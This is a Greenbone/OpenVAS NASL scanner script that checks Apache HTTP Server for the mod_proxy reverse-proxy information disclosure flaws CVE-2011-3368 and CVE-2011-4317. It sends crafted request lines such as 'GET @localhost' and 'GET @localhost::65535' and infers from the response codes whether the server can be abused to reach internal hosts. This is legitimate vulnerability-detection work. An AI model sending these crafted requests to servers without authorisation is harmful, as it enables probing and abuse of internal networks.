# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:http_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103293");
  script_version("2022-12-02T10:11:16+0000");
  script_cve_id("CVE-2011-3368", "CVE-2011-4317");
  script_tag(name:"creation_date", value:"2011-10-11 17:46:33 +0200 (Tue, 11 Oct 2011)");
  script_tag(name:"last_modification", value:"2022-12-02 10:11:16 +0000 (Fri, 02 Dec 2022)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Apache HTTP Server 'mod_proxy' Reverse Proxy Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_apache_http_server_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("apache/http_server/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49957");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50802");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Oct/232");

  script_tag(name:"summary", value:"Apache HTTP Server is prone to an information disclosure
  vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to gain access to sensitive
  information.");

  script_tag(name:"solution", value:"The vendor released an update. Please see the references for details.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) ) # nb: To have a reference to the Detection-VT
  exit( 0 );

banner = http_get_remote_headers( port:port );
if( ! banner || "Apache" >!< banner )
  exit( 0 );

req = http_get( item:"/", port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( ! res || res =~ "^HTTP/1\.[01] 50[23]" || ( res =~ "^HTTP/1\.[01] 200" && "Bad Gateway" >< res ) )
  exit( 0 );

req = 'GET @localhost HTTP/1.0\r\n\r\n';
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ereg( pattern:"^HTTP/1\.[01] 400", string:res ) )
  exit( 99 ); # 400 means not vulnerable

ip3  = "5555.6666.7777.8888";
req  = "GET @" + ip3 + ' HTTP/1.0\r\n\r\n';
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ereg( pattern:"^HTTP/1\.[01] 200", string:res ) && "Bad Gateway" >< res ||
    ereg( pattern:"^HTTP/1\.[01] 502", string:res ) ) {
  security_message( port:port );
  exit( 0 );
}

# CVE-2011-4317
req = 'GET @localhost::65535 HTTP/1.0\r\n\r\n';
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ereg( pattern:"^HTTP/1\.[01] 503", string:res ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
